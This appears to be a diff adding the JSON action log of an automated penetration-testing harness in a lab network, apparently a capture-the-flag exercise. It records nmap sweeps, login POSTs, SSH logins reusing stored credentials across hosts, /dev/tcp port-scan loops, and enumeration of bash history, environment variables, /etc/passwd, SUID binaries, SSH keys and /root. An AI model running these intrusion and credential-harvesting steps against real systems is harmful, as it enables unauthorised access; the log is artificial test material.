+   "resumo": "ssh falhou (codigo 1): /usr/lib/openssh/ssh-keysign; sessao estabelecida; saida: 9 caminhos novos",
+   "revisao": 21,
+   "revisao_ao_abrir": 20
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -D - -o /dev/null -X POST -d username=n1ghtfox&password=c02 http://172.20.0.11:1337/login",
+   "rotulo": "curl -D - -o /dev/null -X POST -d 'username=n1ghtfox&password=c02' http://172.20.0.11:1337/login",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 0 credencial(is)",
+   "revisao": 21,
+   "revisao_ao_abrir": 21
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "cat /home/svc_deploy/.bash_history 2>/dev/null; echo ---; env; echo ---; crontab -l 2>/dev/null; echo ---; ps aux",
+   "rotulo": "cat /home/svc_deploy/.bash_history '2>/dev/null;' echo '---;' 'env;' echo '---;' crontab -l '2>/dev/null;' echo '---;' ps aux",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "sessao estabelecida; saida: 4 caminhos novos",
+   "revisao": 22,
+   "revisao_ao_abrir": 21
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "ls -la /usr/local/bin/ /opt/ /srv/ 2>&1; echo ---; cat /home/svc_deploy/.bash_history 2>&1; echo ---; find / -xdev -iname *deploy* -o -iname *.git 2>/dev/null",
+   "rotulo": "ls -la /usr/local/bin/ /opt/ /srv/ '2>&1;' echo '---;' cat /home/svc_deploy/.bash_history '2>&1;' echo '---;' find / -xdev -iname '*deploy*' '*.git' '2>/dev/null'",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "ssh falhou (codigo 1): /opt/:; sessao estabelecida; saida: nenhum fato novo",
+   "revisao": 22,
+   "revisao_ao_abrir": 22
+  },
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -p- -sV -T4 172.20.0.11",
+   "rotulo": "nmap -p- -sV -T4 172.20.0.11",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "1 hosts, 1 servicos",
+   "revisao": 23,
+   "revisao_ao_abrir": 22
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "ip a; echo ---; cat /etc/hosts; echo ---; netstat -tulpn 2>/dev/null; echo ---; arp -a 2>/dev/null",
+   "rotulo": "ip 'a;' echo '---;' cat '/etc/hosts;' echo '---;' netstat -tulpn '2>/dev/null;' echo '---;' arp -a '2>/dev/null'",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "ssh falhou (codigo 127): 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000; sessao estabelecida; saida: 2 interfaces novas",
+   "revisao": 24,
+   "revisao_ao_abrir": 23
+  },
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -sn 172.21.0.0/24",
+   "rotulo": "nmap -sn 172.21.0.0/24",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "5 hosts, 0 servicos",
+   "revisao": 25,
+   "revisao_ao_abrir": 24
+  },
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -sV -p- -T4 172.21.0.10",
+   "rotulo": "nmap -sV -p- -T4 172.21.0.10",
+   "alvo": "172.21.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "1 hosts, 1 servicos",
+   "revisao": 26,
+   "revisao_ao_abrir": 25
+  },
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -sV -p- -T4 172.21.0.11",
+   "rotulo": "nmap -sV -p- -T4 172.21.0.11",
+   "alvo": "172.21.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "1 hosts, 1 servicos",
+   "revisao": 27,
+   "revisao_ao_abrir": 26
+  },
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -sV -p- -T4 172.21.0.12",
+   "rotulo": "nmap -sV -p- -T4 172.21.0.12",
+   "alvo": "172.21.0.12",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "1 hosts, 1 servicos",
+   "revisao": 28,
+   "revisao_ao_abrir": 27
+  },
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -sV -sC -p- -T4 172.21.0.12",
+   "rotulo": "nmap -sV -sC -p- -T4 172.21.0.12",
+   "alvo": "172.21.0.12",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "1 hosts, 1 servicos",
+   "revisao": 28,
+   "revisao_ao_abrir": 28
+  },
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -p- -T4 -oG - 172.21.0.12 | grep -E open|Ports",
+   "rotulo": "nmap -p- -T4 -oG - 172.21.0.12 '|' grep -E 'open|Ports'",
+   "alvo": "172.21.0.12",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "0 hosts, 0 servicos",
+   "revisao": 28,
+   "revisao_ao_abrir": 28
+  },
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -p- -T4 --open -oN - 172.21.0.12",
+   "rotulo": "nmap -p- -T4 --open -oN - 172.21.0.12",
+   "alvo": "172.21.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "nmap respondeu em formato que o arnes nao le (greppable ou XML); nenhum host foi absorvido; 1 hosts, 1 servicos",
+   "revisao": 28,
+   "revisao_ao_abrir": 28
+  },
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -sV --open -T4 -p- 172.21.0.12",
+   "rotulo": "nmap -sV --open -T4 -p- 172.21.0.12",
+   "alvo": "172.21.0.12",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "1 hosts, 1 servicos",
+   "revisao": 28,
+   "revisao_ao_abrir": 28
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i -m 5 http://172.21.0.12/",
+   "rotulo": "curl -m 5 http://172.21.0.12/",
+   "alvo": "172.21.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "curl falhou (codigo 127): bash: line 1: curl: command not found; http nao observado, 0 credencial(is)",
+   "revisao": 28,
+   "revisao_ao_abrir": 28
+  },
+  {
+   "ferramenta": "netcat",
+   "assinatura": "nc -zv -w2 172.21.0.12 1-1000",
+   "rotulo": "nc -zv -w2 172.21.0.12 1-1000",
+   "alvo": "172.21.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "netcat falhou (codigo 127): bash: line 1: nc: command not found; executado, codigo 127, 36 bytes de resposta",
+   "revisao": 28,
+   "revisao_ao_abrir": 28
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "ssh for p in 21 22 23 25 53 80 110 139 143 443 445 993 995 1433 1521 2049 3306 3389 5432 5900 6379 8000 8008 8080 8443 9000 9090 9200 27017; do (timeout 1 bash -c echo > /dev/tcp/172.21.0.12/$p) 2>/dev/null && echo $p open; done",
+   "rotulo": "ssh for p in 21 22 23 25 53 80 110 139 143 443 445 993 995 1433 1521 2049 3306 3389 5432 5900 6379 8000 8008 8080 8443 9000 9090 9200 '27017;' do '(timeout' 1 bash -c 'echo > /dev/tcp/172.21.0.12/$p)' '2>/dev/null' '&&' echo '$p open;' done",
+   "alvo": "172.21.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "ssh falhou (codigo 2): bash: -c: line 1: syntax error near unexpected token `do'; o servidor nao registrou sessao aceita; saida: nenhum fato novo",
+   "revisao": 29,
+   "revisao_ao_abrir": 28
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "ssh for p in 21 22 23 25 53 80 110 139 143 443 445 993 995 1433 1521 2049 3306 3389 5432 5900 6379 8000 8008 8080 8443 9000 9090 9200 27017; do (echo >/dev/tcp/172.21.0.12/$p) &>/dev/null && echo $p open; done",
+   "rotulo": "ssh for p in 21 22 23 25 53 80 110 139 143 443 445 993 995 1433 1521 2049 3306 3389 5432 5900 6379 8000 8008 8080 8443 9000 9090 9200 '27017;' do '(echo' '>/dev/tcp/172.21.0.12/$p)' '&>/dev/null' '&&' echo '$p' 'open;' done",
+   "alvo": "172.21.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "ssh falhou (codigo 2): bash: -c: line 1: syntax error near unexpected token `do'; o servidor nao registrou sessao aceita; saida: nenhum fato novo",
+   "revisao": 29,
+   "revisao_ao_abrir": 29
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "(echo >/dev/tcp/172.21.0.12/80) 2>/dev/null && echo 80open; (echo >/dev/tcp/172.21.0.12/443) 2>/dev/null && echo 443open; (echo >/dev/tcp/172.21.0.12/22) 2>/dev/null && echo 22open; (echo >/dev/tcp/172.21.0.12/8080) 2>/dev/null && echo 8080open; (echo >/dev/tcp/172.21.0.12/3306) 2>/dev/null && echo 3306open; (echo >/dev/tcp/172.21.0.12/5432) 2>/dev/null && echo 5432open; (echo >/dev/tcp/172.21.0.12/21) 2>/dev/null && echo 21open; (echo >/dev/tcp/172.21.0.12/6379) 2>/dev/null && echo 6379open; (echo >/dev/tcp/172.21.0.12/9000) 2>/dev/null && echo 9000open",
+   "rotulo": "'(echo' '>/dev/tcp/172.21.0.12/80)' '2>/dev/null' '&&' echo '80open;' '(echo' '>/dev/tcp/172.21.0.12/443)' '2>/dev/null' '&&' echo '443open;' '(echo' '>/dev/tcp/172.21.0.12/22)' '2>/dev/null' '&&' echo '22open;' '(echo' '>/dev/tcp/172.21.0.12/8080)' '2>/dev/null' '&&' echo '8080open;' '(echo' '>/dev/tcp/172.21.0.12/3306)' '2>/dev/null' '&&' echo '3306open;' '(echo' '>/dev/tcp/172.21.0.12/5432)' '2>/dev/null' '&&' echo '5432open;' '(echo' '>/dev/tcp/172.21.0.12/21)' '2>/dev/null' '&&' echo '21open;' '(echo' '>/dev/tcp/172.21.0.12/6379)' '2>/dev/null' '&&' echo '6379open;' '(echo' '>/dev/tcp/172.21.0.12/9000)' '2>/dev/null' '&&' echo 9000open",
+   "alvo": "172.21.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "ssh falhou (codigo 1): 22open; o servidor nao registrou sessao aceita; saida: nenhum fato novo",
+   "revisao": 29,
+   "revisao_ao_abrir": 29
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "sshpass -p c01 ssh -o StrictHostKeyChecking=no svc_deploy@172.21.0.12 id; hostname",
+   "rotulo": "sshpass -p c01 ssh svc_deploy@172.21.0.12 'id; hostname'",
+   "alvo": "172.21.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "c01 resolvida para o segredo da credencial; ssh falhou (codigo 5): Warning: Permanently added '172.21.0.12' (ED25519) to the list of known hosts.; permissao negada",
+   "revisao": 30,
+   "revisao_ao_abrir": 29
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "sshpass -p c02 ssh -o StrictHostKeyChecking=no n1ghtfox@172.21.0.12 id; hostname",
+   "rotulo": "sshpass -p c02 ssh n1ghtfox@172.21.0.12 'id; hostname'",
+   "alvo": "172.21.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "c02 resolvida para o segredo da credencial; ssh falhou (codigo 5): Permission denied, please try again.; permissao negada",
+   "revisao": 31,
+   "revisao_ao_abrir": 30
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "sshpass -p c01 ssh -o StrictHostKeyChecking=no svc_deploy@172.21.0.10 id; hostname",
+   "rotulo": "sshpass -p c01 ssh svc_deploy@172.21.0.10 'id; hostname'",
+   "alvo": "172.21.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "c01 resolvida para o segredo da credencial; sessao estabelecida; saida: usuario svc_deploy",
+   "revisao": 33,
+   "revisao_ao_abrir": 31
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "sshpass -p c01 ssh -o StrictHostKeyChecking=no svc_deploy@172.21.0.10 echo ---ID---; id; echo ---HOSTNAME---; hostname; echo ---HOME---; ls -la /home/svc_deploy 2>/dev/null; echo ---OPT---; ls -la /opt /srv 2>/dev/null; echo ---FIND---; find / -xdev \\( -iname \"*trofeu*\" -o -iname \"*troféu*\" -o -iname \"*flag*\" -o -iname \"*.key\" \\) 2>/dev/null",
+   "rotulo": "sshpass -p c01 ssh svc_deploy@172.21.0.10 'echo ---ID---; id; echo ---HOSTNAME---; hostname; echo ---HOME---; ls -la /home/svc_deploy 2>/dev/null; echo ---OPT---; ls -la /opt /srv 2>/dev/null; echo ---FIND---; find / -xdev \\( -iname \"*trofeu*\" -o -iname \"*troféu*\" -o -iname \"*flag*\" -o -iname \"*.key\" \\) 2>/dev/null'",
+   "alvo": "172.21.0.10",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "c01 resolvida para o segredo da credencial; ssh falhou (codigo 1): ---ID---; sessao estabelecida; saida: usuario svc_deploy, 2 caminhos novos",
+   "revisao": 34,
+   "revisao_ao_abrir": 33
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "sshpass -p c01 ssh -o StrictHostKeyChecking=no svc_deploy@172.21.0.10 echo ---OPT---; ls -la /opt; echo ---SRV---; ls -la /srv; echo ---FIND---; find / -xdev -iname \"*trofeu*\" -o -iname \"*troféu*\" -o -iname \"*flag*\" -o -iname \"*.key\" 2>/dev/null; true",
+   "rotulo": "sshpass -p c01 ssh svc_deploy@172.21.0.10 'echo ---OPT---; ls -la /opt; echo ---SRV---; ls -la /srv; echo ---FIND---; find / -xdev -iname \"*trofeu*\" -o -iname \"*troféu*\" -o -iname \"*flag*\" -o -iname \"*.key\" 2>/dev/null; true'",
+   "alvo": "172.21.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "c01 resolvida para o segredo da credencial; sessao estabelecida; saida: nenhum fato novo",
+   "revisao": 34,
+   "revisao_ao_abrir": 34
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "sshpass -p c01 ssh -o StrictHostKeyChecking=no svc_deploy@172.21.0.10 echo ---SUDO---; sudo -l 2>&1; echo ---NET---; (ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null); echo ---PS---; ps aux; echo ---ENV---; env; echo ---VARLIB---; ls -la /var/lib 2>/dev/null; echo ---HIST---; cat /home/svc_deploy/.bash_history 2>/dev/null; true",
+   "rotulo": "sshpass -p c01 ssh svc_deploy@172.21.0.10 'echo ---SUDO---; sudo -l 2>&1; echo ---NET---; (ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null); echo ---PS---; ps aux; echo ---ENV---; env; echo ---VARLIB---; ls -la /var/lib 2>/dev/null; echo ---HIST---; cat /home/svc_deploy/.bash_history 2>/dev/null; true'",
+   "alvo": "172.21.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "c01 resolvida para o segredo da credencial; sessao estabelecida; saida: ferramenta ausente neste host: sudo, 15 caminhos novos",
+   "revisao": 35,
+   "revisao_ao_abrir": 34
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "sshpass -p c01 ssh -o StrictHostKeyChecking=no svc_deploy@172.21.0.10 echo ---NET---; (ss -tlnp 2>&1 || netstat -tlnp 2>&1); echo ---PS---; ps aux 2>&1; echo ---ENV---; env 2>&1; true",
+   "rotulo": "sshpass -p c01 ssh svc_deploy@172.21.0.10 'echo ---NET---; (ss -tlnp 2>&1 || netstat -tlnp 2>&1); echo ---PS---; ps aux 2>&1; echo ---ENV---; env 2>&1; true'",
+   "alvo": "172.21.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "c01 resolvida para o segredo da credencial; sessao estabelecida; saida: nenhum fato novo",
+   "revisao": 35,
+   "revisao_ao_abrir": 35
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "sshpass -p c01 ssh -o StrictHostKeyChecking=no svc_deploy@172.21.0.11 id; hostname",
+   "rotulo": "sshpass -p c01 ssh svc_deploy@172.21.0.11 'id; hostname'",
+   "alvo": "172.21.0.11",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "c01 resolvida para o segredo da credencial; ssh falhou (codigo 5): Warning: Permanently added '172.21.0.11' (ED25519) to the list of known hosts.; permissao negada",
+   "revisao": 36,
+   "revisao_ao_abrir": 35
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "sshpass -p c01 ssh -o StrictHostKeyChecking=no svc_deploy@172.21.0.10 echo ---DBDIRS---; ls -la /var/lib/mysql /var/lib/postgresql /var/lib/sqlite3 2>&1; echo ---DBFILES---; find / -xdev \\( -iname \"*.sql\" -o -iname \"*.db\" -o -iname \"*.sqlite*\" -o -iname \"*dump*\" \\) 2>/dev/null; echo ---CONFIGS---; find /etc -xdev -iname \"*.cnf\" -o -iname \"pg_hba.conf\" 2>/dev/null; true",
+   "rotulo": "sshpass -p c01 ssh svc_deploy@172.21.0.10 'echo ---DBDIRS---; ls -la /var/lib/mysql /var/lib/postgresql /var/lib/sqlite3 2>&1; echo ---DBFILES---; find / -xdev \\( -iname \"*.sql\" -o -iname \"*.db\" -o -iname \"*.sqlite*\" -o -iname \"*dump*\" \\) 2>/dev/null; echo ---CONFIGS---; find /etc -xdev -iname \"*.cnf\" -o -iname \"pg_hba.conf\" 2>/dev/null; true'",
+   "alvo": "172.21.0.10",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "c01 resolvida para o segredo da credencial; ssh falhou (codigo 255): ssh: connect to host 172.21.0.10 port 22: Network is unreachable; sem rota",
+   "revisao": 36,
+   "revisao_ao_abrir": 36
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "sshpass -p c01 ssh -o StrictHostKeyChecking=no svc_deploy@172.21.0.10 echo ---DBDIRS---; ls -la /var/lib/mysql /var/lib/postgresql /var/lib/sqlite3 2>&1; echo ---DBFILES---; find / -xdev \\( -iname \"*.sql\" -o -iname \"*.db\" -o -iname \"*.sqlite*\" -o -iname \"*dump*\" \\) 2>/dev/null; echo ---CONFIGS---; find /etc -xdev -iname \"*.cnf\" -o -iname \"pg_hba.conf\" 2>/dev/null; true",
+   "rotulo": "sshpass -p c01 ssh svc_deploy@172.21.0.10 'echo ---DBDIRS---; ls -la /var/lib/mysql /var/lib/postgresql /var/lib/sqlite3 2>&1; echo ---DBFILES---; find / -xdev \\( -iname \"*.sql\" -o -iname \"*.db\" -o -iname \"*.sqlite*\" -o -iname \"*dump*\" \\) 2>/dev/null; echo ---CONFIGS---; find /etc -xdev -iname \"*.cnf\" -o -iname \"pg_hba.conf\" 2>/dev/null; true'",
+   "alvo": "172.21.0.10",
+   "redundante": true,
+   "sucesso": false,
+   "resumo": "c01 resolvida para o segredo da credencial; ssh falhou (codigo 255): ssh: connect to host 172.21.0.10 port 22: Network is unreachable; sem rota",
+   "revisao": 36,
+   "revisao_ao_abrir": 36
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "sshpass -p c01 ssh -o StrictHostKeyChecking=no svc_deploy@172.21.0.10 echo ---DBDIRS---; ls -la /var/lib/mysql /var/lib/postgresql /var/lib/sqlite3 2>&1; echo ---DBFILES---; find / -xdev \\( -iname \"*.sql\" -o -iname \"*.db\" -o -iname \"*.sqlite*\" -o -iname \"*dump*\" \\) 2>/dev/null; echo ---CONFIGS---; find /etc -xdev -iname \"*.cnf\" -o -iname \"pg_hba.conf\" 2>/dev/null; true",
+   "rotulo": "sshpass -p c01 ssh svc_deploy@172.21.0.10 'echo ---DBDIRS---; ls -la /var/lib/mysql /var/lib/postgresql /var/lib/sqlite3 2>&1; echo ---DBFILES---; find / -xdev \\( -iname \"*.sql\" -o -iname \"*.db\" -o -iname \"*.sqlite*\" -o -iname \"*dump*\" \\) 2>/dev/null; echo ---CONFIGS---; find /etc -xdev -iname \"*.cnf\" -o -iname \"pg_hba.conf\" 2>/dev/null; true'",
+   "alvo": "172.21.0.10",
+   "redundante": true,
+   "sucesso": true,
+   "resumo": "c01 resolvida para o segredo da credencial; sessao estabelecida; saida: 6 caminhos novos",
+   "revisao": 37,
+   "revisao_ao_abrir": 36
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "sshpass -p c01 ssh -o StrictHostKeyChecking=no svc_deploy@172.21.0.10 echo ---SSHKEYS---; find / -xdev \\( -iname \"id_rsa*\" -o -iname \"authorized_keys\" -o -iname \"known_hosts\" -o -iname \"*.pem\" \\) 2>/dev/null; echo ---ETC SSH---; ls -la /etc/ssh 2>/dev/null; echo ---HOME ALL---; ls -la /home 2>/dev/null; true",
+   "rotulo": "sshpass -p c01 ssh svc_deploy@172.21.0.10 'echo ---SSHKEYS---; find / -xdev \\( -iname \"id_rsa*\" -o -iname \"authorized_keys\" -o -iname \"known_hosts\" -o -iname \"*.pem\" \\) 2>/dev/null; echo ---ETC SSH---; ls -la /etc/ssh 2>/dev/null; echo ---HOME ALL---; ls -la /home 2>/dev/null; true'",
+   "alvo": "172.21.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "c01 resolvida para o segredo da credencial; sessao estabelecida; saida: nenhum fato novo",
+   "revisao": 37,
+   "revisao_ao_abrir": 37
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "sshpass -p c02 ssh -o StrictHostKeyChecking=no n1ghtfox@172.21.0.11 id; hostname",
+   "rotulo": "sshpass -p c02 ssh n1ghtfox@172.21.0.11 'id; hostname'",
+   "alvo": "172.21.0.11",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "c02 resolvida para o segredo da credencial; ssh falhou (codigo 5): Permission denied, please try again.; permissao negada",
+   "revisao": 38,
+   "revisao_ao_abrir": 37
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "sshpass -p c01 ssh -o StrictHostKeyChecking=no svc_deploy@172.21.0.10 echo ---PASSWD---; cat /etc/passwd 2>&1; echo ---GROUP---; cat /etc/group 2>&1; echo ---OPTLS---; find /opt /srv -maxdepth 4 -exec ls -lad {} \\; 2>&1; true",
+   "rotulo": "sshpass -p c01 ssh svc_deploy@172.21.0.10 'echo ---PASSWD---; cat /etc/passwd 2>&1; echo ---GROUP---; cat /etc/group 2>&1; echo ---OPTLS---; find /opt /srv -maxdepth 4 -exec ls -lad {} \\; 2>&1; true'",
+   "alvo": "172.21.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "c01 resolvida para o segredo da credencial; sessao estabelecida; saida: nenhum fato novo",
+   "revisao": 38,
+   "revisao_ao_abrir": 38
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "sshpass -p c01 ssh -o StrictHostKeyChecking=no svc_deploy@172.21.0.10 echo ---FILES-OPT---; find /opt -xdev -type f -exec echo ==={}===\\; -exec cat {} \\; 2>&1; echo ---FILES-SRV---; find /srv -xdev -type f -exec echo ==={}===\\; -exec cat {} \\; 2>&1; true",
+   "rotulo": "sshpass -p c01 ssh svc_deploy@172.21.0.10 'echo ---FILES-OPT---; find /opt -xdev -type f -exec echo ==={}===\\; -exec cat {} \\; 2>&1; echo ---FILES-SRV---; find /srv -xdev -type f -exec echo ==={}===\\; -exec cat {} \\; 2>&1; true'",
+   "alvo": "172.21.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "c01 resolvida para o segredo da credencial; sessao estabelecida; saida: nenhum fato novo",
+   "revisao": 38,
+   "revisao_ao_abrir": 38
+  },
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -sT -p- --min-rate 500 -T4 172.21.0.1",
+   "rotulo": "nmap -sT -p- --min-rate 500 -T4 172.21.0.1",
+   "alvo": "172.21.0.1",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "1 hosts, 2 servicos",
+   "revisao": 39,
+   "revisao_ao_abrir": 38
+  },
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -sV -sC -p111,55263 172.21.0.1",
+   "rotulo": "nmap -sV -sC -p111,55263 172.21.0.1",
+   "alvo": "172.21.0.1",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "1 hosts, 2 servicos",
+   "revisao": 40,
+   "revisao_ao_abrir": 39
+  },
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -sV --script=nfs-showmount,rpcinfo -p111,55263 172.21.0.1",
+   "rotulo": "nmap -sV --script=nfs-showmount,rpcinfo -p111,55263 172.21.0.1",
+   "alvo": "172.21.0.1",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "1 hosts, 2 servicos",
+   "revisao": 40,
+   "revisao_ao_abrir": 40
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "sshpass -p c01 ssh -o StrictHostKeyChecking=no svc_deploy@172.21.0.10 echo ---SUID---; find / -xdev -perm -4000 -type f 2>/dev/null; echo ---CAP---; getcap -r / 2>/dev/null; echo ---CRON---; cat /etc/crontab 2>/dev/null; ls -la /etc/cron.d 2>/dev/null; echo ---ROOT---; ls -la /root 2>&1; true",
+   "rotulo": "sshpass -p c01 ssh svc_deploy@172.21.0.10 'echo ---SUID---; find / -xdev -perm -4000 -type f 2>/dev/null; echo ---CAP---; getcap -r / 2>/dev/null; echo ---CRON---; cat /etc/crontab 2>/dev/null; ls -la /etc/cron.d 2>/dev/null; echo ---ROOT---; ls -la /root 2>&1; true'",
+   "alvo": "172.21.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "c01 resolvida para o segredo da credencial; sessao estabelecida; saida: 10 caminhos novos",
+   "revisao": 41,
+   "revisao_ao_abrir": 40
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "sshpass -p c01 ssh -o StrictHostKeyChecking=no svc_deploy@172.21.0.10 echo ---ROOTLS---; ls -la /root 2>&1; echo ---ROOTFILES---; find /root -type f -exec echo ==={}===\\; -exec cat {} \\; 2>&1; true",
+   "rotulo": "sshpass -p c01 ssh svc_deploy@172.21.0.10 'echo ---ROOTLS---; ls -la /root 2>&1; echo ---ROOTFILES---; find /root -type f -exec echo ==={}===\\; -exec cat {} \\; 2>&1; true'",
+   "alvo": "172.21.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "c01 resolvida para o segredo da credencial; sessao estabelecida; saida: nenhum fato novo",
+   "revisao": 41,
+   "revisao_ao_abrir": 41
+  }
+ ],
+ "credenciais_omitidas": 0,
+ "revisao": 41,
+ "trofeu": false
+}
